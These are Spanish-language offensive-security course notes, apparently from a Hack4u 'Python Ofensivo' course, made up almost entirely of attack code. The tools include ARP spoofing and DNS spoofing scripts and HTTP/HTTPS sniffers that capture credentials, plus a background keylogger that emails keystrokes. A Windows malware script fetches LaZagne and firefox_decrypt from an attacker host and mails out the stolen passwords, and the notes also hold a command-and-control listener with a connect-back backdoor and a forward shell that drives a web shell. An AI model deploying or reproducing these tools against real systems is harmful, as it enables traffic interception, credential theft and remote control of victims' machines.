---
title: Python Ofensivo 🦭
tags:
  - Theory
  - Hack4u
---
>[!Warning]
>*This course is fully in spanish :d*

![](Pasted%20image%2020240826120138.png)

## Escáner de puertos TCP

```python
#!/usr/bin/env python3
import socket
import argparse
import sys
import signal # para manejar señales de teclado
from concurrent.futures import ThreadPoolExecutor # mejor que threading para evitar la creación de demasiados hilos
from termcolor import colored # para poner colores en la terminal

open_sockets = []

def def_handler(sig, frame): # para cuando se para la ejecución de forma brusca
    print(colored(f"\n[!] Saliendo del programa...", 'red'))

    for socket in open_sockets:
        socket.close()
    
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # Ctrl+C

def get_arguments():
    parser = argparse.ArgumentParser(description='Fast TCP Port Scanner')
    parser.add_argument("-t", "--target", dest="target", required=True, help="Victim target to scan (Ex: -t 192.168.1.1)")
    parser.add_argument("-p", "--port", dest="port", required=True, help="Port range to scan (Ex: -p 1-100)")
    options = parser.parse_args()

    return options.target, options.port

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1) # el tiempo hasta el que se puede demorar para establecer la conexión

    open_sockets.append(s)

    return s

def port_scanner(port, host):

    s = create_socket()

    try: # es mejor hacerlo con excepciones
        s.connect((host, port))
        s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
        response = s.recv(1024).decode(errors='ignore').split('\n')

        if response:
            print(colored(f"\n[+] El puerto {port} está abierto - {response}\n", 'green'))

            for line in response:
                print(colored(line, 'grey'))
        else:
            print(colored(f"\n[+] El puerto {port} está abierto\n", 'green'))
    except (socket.timeout, ConnectionRefusedError):
        pass
    finally:
        s.close()

def scan_ports(ports, target):
    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.map(lambda port: port_scanner(port, target), ports) # para cada puerto le aplico la función port scanner

def parse_ports(ports_str, target):
    if '-' in ports_str:
        start, end = map(int, ports_str.split('-'))
        return range(start, end+1)
    elif ',' in ports_str:
        return map(int, ports_str.split(','))
    else:
        return (int(ports_str),)

def main():
    target, ports_str = get_arguments()
    ports = parse_ports(ports_str, target)
    scan_ports(ports, target)
    

if __name__ == '__main__':
    main()
```

## Programa que cambia la dirección MAC (macchanger)

```python
#!/usr/bin/env python3

import argparse
import subprocess
import re # para las regex
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo del programa\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="Herramienta para cambiar la dirección MAC de una interfaz de red")
    parser.add_argument("-i", "--interface", required=True, dest="interface", help="Nombre de la interfaz de red")
    parser.add_argument("-m", "--mac", required=True, dest="mac_address", help="Nueva dirección MAC para la interfaz de red")

    return parser.parse_args()

def is_valid_input(interface, mac_address):
    is_valid_interface = re.match(r'^[e][n|t][s|h]\d{1,2}$', interface)
    is_valid_mac_address = re.match(r'^([A-Fa-f0-9]{2}[:]){5}[A-Fa-f0-9]{2}$', mac_address) # 00:0c:29:4d:18:eb <- ejemplo de mac

    return is_valid_interface and is_valid_mac_address

def change_mac_address(interface, mac_address):
    if is_valid_input(interface, mac_address):
        subprocess.run(["ifconfig", interface, "down"]) # aquí se evitan inyecciones de comandos
        subprocess.run(["ifconfig", interface, "hw", "ether", mac_address])
        subprocess.run(["ifconfig", interface, "up"])
        print(colored(f"\n[+] la MAC ha sido cambiada exitosamente", 'green'))
    else:
        print(colored("Los datos introducidos no son correctos", 'red'))

def main():
    args = get_arguments()
    change_mac_address(args.interface, args.mac_address)

if __name__ == '__main__':
    main()
```

## Escáner de red ICMP

```python
#!/usr/bin/env python3

import argparse
import subprocess
import signal
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor
import sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo del programa...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="Herramienta para descubrir hosts activos en una red (ICMP)")
    parser.add_argument("-t", "--target", required=True, dest="target", help="Host o rango de red a escanear")

    args = parser.parse_args()

    return args.target

def parse_target(target_str):
    #192.168.1.1-100
    target_str_splitted = target_str.split('.') # ["192", "168", "1", "1-100"]
    first_three_octets = '.'.join(target_str_splitted[:3]) # 192.168.1

    if len(target_str_splitted) == 4:
        if "-" in target_str_splitted[3]:
            start, end = target_str_splitted[3].split('-')
            return [f"{first_three_octets}.{i}" for i in range(int(start), int(end)+ 1)]
        else:
            return [target_str]
    else:
        print(colored(f"\n[!] El formato de IP o rango de IP no es válido", 'red'))

def host_discovery(target):
    try:
        ping = subprocess.run(["ping", "-c", "1", target], timeout=1, stdout=subprocess.DEVNULL) # DEVNULL: para no ver el stdout 

        if ping.returncode == 0: # host activo
            print(colored(f"\t[i] la IP {target} está activa", 'green'))
    except subprocess.TimeoutExpired:
        pass

def main():
    target_str = get_arguments()
    targets = parse_target(target_str)
    print(colored(f"\n[+] Hosts activos en la red:\n", 'blue'))

    max_threads = 100
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        executor.map(host_discovery, targets)

if __name__ == '__main__':
    main()
```

## Escáner de red ARP con Scapy

```python
#!/usr/bin/env python3

import scapy.all as scapy
import argparse

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Scanner")
    parser.add_argument("-t", "--target", required=True, dest="target", help="Host / IP Range to Scan")

    args = parser.parse_args()

    return args.target

def scan(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast_packet/arp_packet # para unificar ambas capas

    answered, unanswered = scapy.srp(arp_packet, timeout=1, verbose=False) # para enviar el paquete

    response = answered.summary()

    if response:
        print(response)

def main():
    target = get_arguments()
    scan(target)

if __name__ == '__main__':
    main()
```

## Envenenador ARP (ARP Spoofer) con Scapy

```python
#!/usr/bin/env python3
import argparse
import time
import sys
import scapy.all as scapy
import signal # para manejar señales de teclado
from termcolor import colored # para poner colores en la terminal

# Con este script puedes ejecutar un MiTM colocándote entre el router y la máquina víctima

def def_handler(sig, frame): # para cuando se para la ejecución de forma brusca
    print(colored(f"\n[!] Saliendo del programa...", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # Ctrl+C

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range to spoof")

    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66") # si pones 2 estás enviando una respuesta que no ha sido solicitada
    scapy.send(arp_packet, verbose=False) # no quiero recibir nada, solo tramitar el paquete concreto a su destino, por eso se usa send()

def main():
    arguments = get_arguments()

    while True: # hay que hacerlo continuamente porque en la red los dispositivos se comunican constantemente
        spoof(arguments.ip_address, "192.168.1.1") # la que se le envía a la máquina víctima
        spoof("192.168.1.1", arguments.ip_address) # la que se le envía al router haciéndose pasar por la máquina víctima
        time.sleep(2)

if __name__ == '__main__':
    main()
```

## Rastreador de consultas DNS (DNS Sniffer) con Scapy

- Combinarlo con el `arps_poofer.py` para interceptar el tráfico

```python
#!/usr/bin/env python3

import scapy.all as scapy

def process_dns_packet(packet):
    if packet.haslayer(scapy.DNSQR): # filtra por paquetes que contengas la capa DNSQR
        #print(packet.show())
        domain = packet[scapy.DNSQR].qname.decode()
        exclude_keywords = ["google", "cloudflare", "bing", "static"] # blacklist

        if domain not in domains_seen and not any(keyword in domain for keyword in exclude_keywords): 
            domains_seen.add(domain)
            
            print(f"[+] Dominio: {domain}")

def sniff(interface):
    print(f"\n[+] Interceptando paquetes de la máquina víctima\n")
    scapy.sniff(iface=interface, filter="udp and port 53", prn=process_dns_packet, store=0)

def main():
    sniff("ens33") # le pasas la interfaz de red a sniff

if __name__ == '__main__':
    global domains_seen
    domains_seen = set()

    main()
```

## Rastreador de consultas HTTP (HTTP sniffer) con Scapy

Es necesario ejecutar el ARP Spoofer.

```python
#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import signal # para manejar señales de teclado
import sys

def def_handler(sig, frame): # para cuando se para la ejecución de forma brusca
    print(colored(f"\n[!] Saliendo del programa...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # Ctrl+C

def process_packet(packet):
    cred_keywords = ["login", "user", "pass", "mail"]

    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
            print(colored(f"[+] URL visitada por la víctima: {url}", 'blue'))
            try:
                response = packet[scapy.Raw].load.decode()

                for keyword in cred_keywords:
                    if keyword in response:
                        print(colored(f"\n[+] Posibles credenciales: {response}", 'green'))
                        break
            except:
                pass

def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    sniff("ens33") # le pasas la interfaz de red a sniff

if __name__ == '__main__':

    main()
```

## Rastreador de consultas HTTPS (HTTPS Sniffer) con mitmdump

Es necesario ejecutar el ARP Spoofer.

- Instálalo:

```shell
mkdir MITM && cd MITM
wget mitmproxy-xxx.tar.gz
tar -xf mitmproxy-xxx.tar.gz && rm mitmproxy-xxx.tar.gz 
```

1. **Máquina víctima**

- Ejecuta el binario: `./mitweb` en la máquina atacante
- Configurar el proxy (Windows):

```cmd
add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_DWORD /d 1 /f

add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "IP_ATACANTE_PROXY:PUERTO" /f
```

> Para eliminar el proxy:

```cmd
add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_DWORD /d 0 /f

del "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "IP_ATACANTE_PROXY:PUERTO" /f
```

- Visita [mitm.it](http://mitm.it) e instala el certificado.
	- Coloca el certificado en "Entidades de certificación raíz de confianza"
	- Borra el certificado de las descargas y vacía la papelera
- Para el binario `mitweb`

2. **Máquina atacante**

- Ejecuta el binario: `./mitmproxy`

```python
#!/usr/bin/env python3
from mitmproxy import http
from mitmproxy import ctx
from urllib.parse import urlparse

def has_keywords(data, keywords):
    return any(keyword in data for keyword in keywords)

def request(packet):
    #ctx.log.info(f"[+] URL: {packet.request.url}")
    url = packet.request.url
    url_parsed = urlparse(url)
    scheme = url_parsed.scheme
    domain = url_parsed.netloc
    path = url_parsed.path

    print(f"[+] URL visitada por la víctima: {scheme}.//{domain}{path}")

    keywords = ["user", "pass"]
    data = packet.request.get_text()

    if has_keywords(data, keywords):
        print(f"\[+] Posibles credenciales capturadas:\n{data}\n")
```

> [!Note]
> Para ejecutar el script: `./mitmdump -s https_sniffer.py`

## Rastreador de imágenes por HTTPS (HTTPS Image Sniffer) con mitmdump

Es necesario ejecutar el ARP Spoofer.

```python
#!/usr/bin/env python3

from mitmproxy import http

def response(packet):
    content_type = print(packet.response.headers.get("content-type", "-")) # para los que no tienen un valor (None)

    try:
        if "image" in content_type:
            url = packet.request.url
            extension = content_type.split("/")[-1]
            
            if extension == "jpeg": # para evitar errores de previsualización de jpeg
                extension = "jpg" 

            file_name = f"images/{url.replace('/', '_').replace(':', '_')}.{extension}"
            image_data = packet.response.content

            with open(file_name, "wb") as f:
                f.write(image_data)

            print(f"[+] Imagen guardada: {file_name}")
    except:
        pass
```

- Ejecutar con `mitmdump -s https_image_sniffer.py --quiet`

## DNS Spoofer con Scapy y NetfilterQueue

Es necesario ejecutar el ARP Spoofer.

Ejecutar los siguientes comandos para poder redirigir paquetes entrantes, salientes y los que se estén redirigiendo a la cola con id 0:

```shell
iptables -I INPUT -j NFQUEUE --queue-num 0
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I FORWARD -j NFQUEUE --queue-num 0
iptables --policy FORWARD ACCEPT # para el envenenamiento ARP (aceptar los paquetes entrantes y poderlos redirigir al destino legítimo)
```

```python
#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import signal
import sys

def def_handler(sig, frame):
    print(f"\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        #print(scapy_packet)
        qname = scapy_packet[scapy.DNSQR].qname # para obtener el nombre de dominio

        if b"hack4u.io" in qname:
            print(f"\n[+] Envenenando el dominio hack4u.io")
            
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.40") # en rdata poner nuestra IP    
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1 # para que no de conflictos

            del scapy_packet[scapy.IP].len # borramos el campo de longitud
            del scapy_packet[scapy.IP].chksum # borramos el campo de checksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(scapy_packet.build()) # con build() pones el paquete en formato bytes

    packet.accept() # sin esto no se puede navegar porqyue el tráfico no se acepta 

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) # 0 es el número de cola
queue.run() # Está continuamente analizando
```

## Manipulador e Interceptor de tráfico (Traffic Hijacking)

Es necesario ejecutar el ARP Spoofer.

Ejecutar los siguientes comandos para poder redirigir paquetes entrantes, salientes y los que se estén redirigiendo a la cola con id 0:

```shell
iptables -I INPUT -j NFQUEUE --queue-num 0
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I FORWARD -j NFQUEUE --queue-num 0
iptables --policy FORWARD ACCEPT # para el envenenamiento ARP (aceptar los paquetes entrantes y poderlos redirigir al destino legítimo)
```

```python
#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len # para evitar la comprobación de la integridad del paquete
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                print(f"\n[+] Solicitud:\n")
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load) # para evitar que el servidor responda sin comprimir toda la data
                new_packet = set_load(scapy_packet, modified_load) # paquete modificado
                packet.set_payload(new_packet.build())
            elif scapy_packet[scapy.TCP].sport == 80:
                print(f"\n[+] Respuesta del servidor:\n")
                #modified_load = scapy_packet[scapy.Raw].load.replace(b"Home of Acunetix Art", b"Hacked") # se sustituye una parte del código fuente de la web
                modified_load = scapy_packet[scapy.Raw].load.replace(b'<a href="https://www.acunetix.com/vulnerability-scanner">', b'<a href="https://hack4u.io">') # modificamos un enlace para que lleve al que nosotros queremos
                # Podrías meter un script antes de una etiqueta o cualquier cosa
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())
                print(scapy_packet.show())
        #except Exception as e: # genera ruido
        #    print(f"\n[ERROR]: {e}")
        except:
            pass

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

## Generar Expresiones regulares en python (regex generator)

> Go to [pythex.org](http://pythex.org/)

## Keylogger

Ejecutar con el siguiente comando para que funcione en segundo plano:

```shell
python3 main.py &> /dev/null & disown
```

```python
# main.py

#!/usr/bin/env python3

from keylogger import Keylogger
import signal
import sys
from termcolor import colored

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    my_keylogger.shutdown()
    import sys

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    my_keylogger = Keylogger()
    my_keylogger.start()
```

```python
# keylogger.py

#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib # para enviar cosas por correo
from email.mime.text import MIMEText

class Keylogger:
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def pressed_key(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " Backspace", key.enter: " Enter", key.shift: " Shift", key.ctrl: " Ctrl", key.alt:" Alt"}
            self.log += special_keys.get(key, f" {str(key)}") # mejor que tener tropecientos if elif, las que no están contempladas en el diccionario toman el valor str(key)}

        print(self.log)

    def send_email(self, subject, body, sender, recipients, password): # https://mailtrap.io/blog/python-send-email-gmail/
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print("Message sent!")

    def report(self):
        email_body = "[+] El Keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body, "sender@gmail.com", ["receiver1@gmail.com", "receiver2@gmail.com"], "app_token")
        # para crear un app token:
        # Activar 2FA -> ve a Ajustes >> Seguridad >> Verificación en dos pasos
        # Ajustes >> Seguridad >> Contraseñas de aplicaciones
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(5, self.report) # con esta función, cada 5 segundos llamas a la función report(), lo que es una llamada recursiva
            self.timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key) # primero creamos un listener

        with keyboard_listener: # en caso de que pete, se cierra el listener automáticamente
            self.report()
            keyboard_listener.join() # arranca el listener

    def shutdown(self):
        self.request_shutdown = True

        if self.timer:
            self.timer.cancel # cancelo el hilo para salir del programa al momento
```

## Creación de Malware (para Windows)

```python
#!/usr/bin/env python3
# coding: cp850

import subprocess
import requests
import smtplib # para enviar cosas por correo
from email.mime.text import MIMEText
import tempfile # para crear directorios temporales
import os
import sys

def send_email(subject, body, sender, recipients, password): # https://mailtrap.io/blog/python-send-email-gmail/
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print("Message sent!")

def run_command(command):
    try:
        output_command = subprocess.check_output(command, shell=True).decode("cp850")
        return output_command.strip() if output_command else None
    except:
        print(f"\n[!] Error al ejecutar el comando {command}.")
        return None

def download_and_execute_lazagne(): # El Defender no permite ejecutarlo
    # first download lazagne on your machine: https://github.com/AlessandroZ/LaZagne
    r = requests.get("http://YOUR_IP:PORT/lazagne.exe")
    temp_file = tempfile.mkdtemp()
    os.chdir(tempfile)

    with open("lazagne.exe", "wb") as f:
         f.write(r.content)

    lazagne_output = run_command("lazagne.exe browsers")

    os.remove("lazagne.exe")
    return lazagne_output

def get_firefox_profiles(username):
    path = f"C:\\Users\\{username}\\AppData\\Roami\\Mozilla\\Firefox\\Profiles"
    try:
        profiles = [profile for profile in os.listdir(path) if "release in profile"]
        return profiles[0] if profiles else None
    except Exception as e:
         print(f"\n[!] No ha sido posible obtener los profiles de Firefox\n")

def get_firefox_passwords(username, profile):
    # Nos descargamos el script de la máquina atacante
    r = requests.get("http://YOUR_IP:YOUR_PORT/firefox_decrypt.py")
    temp_dir = tempfile.mkdtemp()
    os.chdir(temp_dir)

    with open("firefox_decrypt.py", "wb") as f:
        f.write(r.content)

    command = f"python firefox_decrypt.py C:\\Users\\{username}\\AppData\\Roami\\Mozilla\\Firefox\\Profiles\\{profile}"
    passwords = run_command(command)
    os.remove("firefox_decrypt.py")

    return passwords

if __name__ == '__main__':
    # ipconfig_output = run_command("ipconfig")
    # users_info = run_command("net user")
    #
    # send_email("Ipconfig info", ipconfig_output, "sender@gmail.com", ["receiver1@gmail.com", "receiver2@gmail.com"], "app_token")
    # send_email("Users info", users_info, "sender@gmail.com", ["receiver1@gmail.com", "receiver2@gmail.com"], "app_token")

    # output_lazagne = download_and_execute_lazagne()
    # print(output_lazagne)
    # send_email("Lazagne output", output_lazagne, "sender@gmail.com", ["receiver1@gmail.com", "receiver2@gmail.com"], "app_token")

    username = run_command("whoami").split("\\")[1]
    profile = get_firefox_profiles(username)

    if not username or not profile:
        sys.exit(f"\n[!] Ha habido un error con el usuario o los perfiles\n")
    
    passwords = get_firefox_passwords(username, profile)

    if passwords:
        send_email("Decrypted Firefox Passwords", passwords, "sender@gmail.com", ["receiver1@gmail.com", "receiver2@gmail.com"], "app_token")
    else:
        print("No se han encontrado contraseñas")
```

## Erear un ejecutable(Windows) de python

```shell
pyinstaller --onefile FILE.py
```

## Creación de un Command and Control (C&C)

```python
# listener.py

#!/usr/bin/env python3
import socket
import signal
import sys
from termcolor import colored
import smtplib # para enviar cosas por correo
from email.mime.text import MIMEText

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Listener:

    def __init__(self, ip, port):
        self.options = {"get users": "List syustem valid users (Gmail)", "help": "Show this help panel"}

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # para poder reutilizar la misma conexión
        server_socket.bind(ip, port)
        server_socket.listen()

        print(f"\n[+] Listening for incoming connections...")

        self.client_socket, self.client_address = server_socket.accept()

        print(f"\n[+] Connection established by {self.client_address}")

    def execute_remotely(self, command):
        self.client_socket.send(command.encode())
        return self.client_socket.recv(2048).decode()

    def get_users(self):
        self.client_socket.send(b"net user")
        output_command = self.client_socket.recv(2048).decode()

    def send_email(self, subject, body, sender, recipients, password): # https://mailtrap.io/blog/python-send-email-gmail/
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print("Message sent!")

    def show_help(self):
        for key, value in self.options.items():
            print(f"{key} - {value}\n")

    def run(self):
        while True:
            command = input("$> ")

            if command == "get users":
                self.get_users()
            elif command == "help":
                self.show_help()
            else:
                command_output = self.execute_remotely(command)
                print(command_output)

if __name__ == '__main__':
    my_listener = Listener("192.168.1.40", 666)
    my_listener.run()
```

```python
# backdoor.py

#!/usr/bin/env python3
import socket
import subprocess

# FIRST: start the listener

def run_command(command):
    command_output = subprocess.check_output(command, shell=True).decode("cp850")
    return command_output

if __name__ == '__main__':
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(("192.168.1.40", 666))

    while True:
        command = client_socket.recv(1024).decode().strip() # para respuestas más largas ampliar el control de bytes
        command_output = run_command(command)
        client_socket.send(b"\n" + command_output.encode() + b"\n")

    client_socket.close()
```

## Creación de una Forward Shell

Vienen bien cuando no se puede insertar una reverse shell debido a restricciones de firewall:

```python
# main.py

#!/usr/bin/env python3

from forward_shell import ForwardShell
import signal
import sys
from termcolor import colored

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    my_forward_shell.remove_data()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    my_forward_shell = ForwardShell()
    my_forward_shell.run()
```

```python
# fordwar_shell.py

#!/usr/bin/env python3

import requests
from termcolor import colored
from base64 import b64encode # por los caracteres especiales
from random import randrange
import time

class ForwardShell:
    def __init__(self):
        session = randrange(1000, 9999)
        self.main_url = "http://localhost/index.php"
        self.stdin = f"/dev/shm/{session}.input" # directorio temporal que se frecuenta menos
        self.stdout = f"/dev/shm/{session}.output"
        self.help_options = {'enum suid': 'FileSystem SUID Privileges Enumeration', 'help': 'Show this help panel'}
        self.is_pseudo_terminal = False

    def run_command(self, command):
        command = b64encode(command.encode()).decode()

        data = { # lo que se envía
            'cmd': 'echo %s | base64 -d | /bin/sh' % command
        }

        try:
            r = requests.get(self.main_url, params=data, timeout=5)
            return r.text
        except:
            pass

        return None

    def write_stdin(self, command: str) -> str:
        command = b64encode(command.encode()).decode()

        data = {
            'cmd': 'echo %s | base64 -d > %s' % (command, self.stdin)
        }

        r = requests.get(self.main_url, params=data)

    def read_stdout(self):
        for _ in range(5): # para que el archivo output tenga todo el contenido
            read_stdout_command = f"/bin/cat {self.stdout}"
            output_command = self.run_command(read_stdout_command)
            time.sleep(0.1)
            return output_command

    def setup_shell(self):
        command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin, self.stdin, self.stdout)
        self.run_command(command)

    def remove_data(self):
        remove_data_command = f"/bin/rm {self.stdin} {self.stdout}"
        self.run_command(remove_data_command)

    def clear_stdout(self):
        clear_stdout_command = f"echo '' > {self.stdout}"
        self.run_command(clear_stdout_command)

    def run(self):
        self.setup_shell()
        while True:
            command = input(colored("$> ", 'red'))

            if "script /dev/null -c bash" in command:
                print(colored(f"\n[+] Se ha iniciado una pseudoterminal\n", 'green'))
                self.is_pseudo_terminal = True

            if command.strip() == "enum suid":
                command = f"find / -perm -4000 2>/dev/null | xargs ls -l"

            if command.strip() == "help":
                print(colored(f"\n[+] Listando panel de ayuda\n", 'yellow'))

                for key, value in self.help_options.items():
                    print(f"\t{key} - {value}\n")

                continue

            self.write_stdin(command + "\n") # para que simule haber presionado el Enter
            output_command = self.read_stdout()

            if command.strip() == "exit":
                self.is_pseudo_terminal = False
                self.clear_stdout()
                continue

            if self.is_pseudo_terminal:
                lines = output_command.split('\n')
                if len(lines) == 3:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1])
                elif len(lines) > 3:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1] + lines[2:-1])
                print("\n" + cleared_output + "\n")
            else:
                print(output_command)
            self.clear_stdout()
```

